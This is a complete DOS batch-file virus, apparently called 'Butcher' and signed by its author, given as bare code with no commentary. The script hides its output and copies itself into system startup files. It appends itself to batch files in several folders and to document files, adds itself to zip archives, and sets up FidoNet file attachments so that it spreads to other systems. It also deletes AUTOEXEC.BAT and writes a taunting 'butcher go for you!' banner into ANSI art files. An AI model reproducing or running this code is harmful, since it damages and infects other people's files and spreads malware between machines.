:Version 1.61!
@ctty nul
goto sw
:re
set r= %r%
if "%0"=="WINSTART.BAT" goto win
goto next
:win
@ctty con
copy %0 c:\butcher.txt
goto qwe
:next
if not exist %Windir%\winstart.bat copy %0 %windir%\winstart.bat
if "%0"=="AUTOEXEC.BAT" del %0
if exist c:\butcher.txt goto ok
type ok >> c:\butcher.txt
attrib c:\butcher.txt +h
copy %0 c:\systdrv.bat
for %%a in (c:\fido\*.bat) %r% %%a+%0
for %%b in (c:\utils\*.bat) %r% %%b+%0
for %%c in (c:\util\*.bat) %r% %%c+%0
for %%c in (c:\мои документы\*.doc) %r% %%c+%0
for %%d in (d:\tools\*.bat) %r% %%d+%0
for %%e in (c:\tools\*.bat) %r% %%e+%0
attrib c:\fido attach.bat -r
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\bvdfg.txt +h +r
:ok
if exist c:\butcpic.txt goto cont
echo [0;1;33m[2J[6C[32mWarning! > c:\butcpic.txt
echo  [36m butcher go for you!  >> c:\butcpic.txt
:cont
for %%j in (*.bat ..\*.bat) do if %%j==ATTACH.BAT goto att
goto re
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:re
for %%f in (*.bat ..\*.bat) do find "TRTL" %%f
if not errorlevel 1 goto next
@for %%k in (*.bat ..\*.bat ..\..\*.bat) do copy %%k+%0
:next
for %%z in (*.zip ..\*.zip) do pkzip %%z %0
for %%q in (*.ans c:\max\*.ans) do type c:\butcher.txt >> %%q
@ctty con
goto qwe
:sw
goto re
:qwe
: (c) Steel!

